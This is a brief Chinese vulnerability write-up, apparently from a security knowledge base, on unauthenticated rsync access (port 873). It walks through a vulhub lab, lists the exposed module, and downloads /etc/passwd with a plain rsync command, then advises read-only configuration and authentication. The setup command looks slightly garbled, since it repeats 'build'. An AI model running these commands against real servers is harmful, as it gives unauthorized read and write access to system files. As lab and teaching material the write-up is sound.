---
title: 'rsync-未授权访问漏洞'
date: Sun, 27 Sep 2020 12:54:50 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 前言

rsync是Linux下一款数据备份工具，支持通过rsync协议、ssh协议进行远程文件传输。其中rsync协议默认监听873端口，如果目标开启了rsync服务，并且没有配置ACL或访问密码，我们将可以读写目标服务器文件。

#### 环境搭建

```
cd vulhub/rsync/common 
``````
docker-compose build && docker-compose build 
```环境启动后，我们用rsync命令访问之： 有一个src模块，我们再列出这个模块下的文件：```
rsync rsync://your-ip:873/src/ 
```![](rsync-未授权访问漏洞.assets/1627364675302814.jpg) 这是一个Linux根目录，我们可以下载任意文件：```
rsync -av rsync://your-ip:873/src/etc/passwd ./ 
```![](rsync-未授权访问漏洞.assets/162736467551821.jpg)

#### 修复建议

配置只读配置认证用户名或者密码